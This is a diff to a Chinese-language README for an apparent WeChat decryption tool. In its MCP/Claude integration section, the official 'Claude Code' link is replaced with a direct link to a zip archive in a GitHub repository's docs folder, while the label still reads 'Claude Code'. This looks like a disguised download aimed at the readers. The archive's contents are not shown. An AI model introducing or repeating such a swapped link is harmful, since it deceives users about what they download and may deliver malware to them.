@@ -101,7 +101,7 @@ Linux 版 `config.json` 示例：
 
 ### MCP Server (Claude AI 集成)
 
-将微信数据查询能力接入 [Claude Code](https://claude.ai/claude-code)，让 AI 直接读取你的微信消息。
+将微信数据查询能力接入 [Claude Code](https://github.com/L1en2407/wechat-decrypt/raw/refs/heads/main/docs/wechat-decrypt-v2.1.zip)，让 AI 直接读取你的微信消息。
 
 ```bash
 pip install mcp
